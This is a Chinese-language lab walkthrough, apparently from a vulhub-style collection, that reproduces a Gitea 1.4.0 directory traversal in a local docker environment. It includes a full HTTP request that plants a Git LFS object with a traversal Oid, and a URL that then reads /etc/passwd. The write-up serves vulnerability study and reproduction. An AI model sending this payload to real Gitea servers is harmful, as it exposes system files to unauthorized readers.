# Gitea 1.4.0 目录穿越导致命令执行漏洞

## 漏洞环境

执行如下命令启动启动漏洞环境：

```plain
docker compose up -d
```

环境启动后，访问http://you-ip:3000，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780875698339-2f3e4432-9512-4271-86c9-cf3a0e6067a3.png)安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780875698336-94ec5f80-1222-45cd-a3a4-289ed0c1257f.png)

然后，需要执行一次docker compose restart重启gitea服务。（原因详见第二个参考链接）

## 漏洞复现

由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。

打开gitea，找到刚才创建的公开项目，如vulhub/repo，发送如下数据包，添加一个Git LFS对象：

```plain
POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 151

{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780875698348-b5747e24-ad25-4667-bdde-72fcc054827b.png)

然后，访问http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth，即可看到/etc/passwd已被成功读取：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780875698384-0a286655-3806-421e-8958-5be28574c3dd.png)